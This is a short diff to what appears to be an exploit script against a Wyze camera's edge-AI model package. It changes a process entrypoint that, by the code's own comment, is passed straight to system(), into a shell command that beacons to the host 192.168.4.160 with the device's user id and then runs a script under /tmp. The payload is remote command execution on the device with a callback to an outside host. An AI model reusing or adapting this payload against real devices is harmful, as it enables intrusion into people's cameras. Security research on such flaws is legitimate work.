@@ -218,7 +218,13 @@ def main() -> int:
                     ]
                     procs = [
                         {"processname": "wyzeedgeai_cam_v4_test_protocol",
-                         "entrypoint": "sh /tmp/edgeai/launch.sh", "maxstartuptime": 60,
+                         # the entrypoint is ours and goes straight to system(): make it self-contained
+                         # so a missing directory or an unwritten file cannot swallow the proof.
+                         "entrypoint": ("sh -c 'mkdir -p /tmp/edgeai; "
+                                        "curl -s -m 5 -o /dev/null "
+                                        "\"http://192.168.4.160:8080/fss-ran?uid=$(id -u)&via=entry\"; "
+                                        "sh /tmp/edgeai/launch.sh'"),
+                         "maxstartuptime": 60,
                          "version": model_ver,
                          "components": [{"checksum": c,
                                          "filename": f,
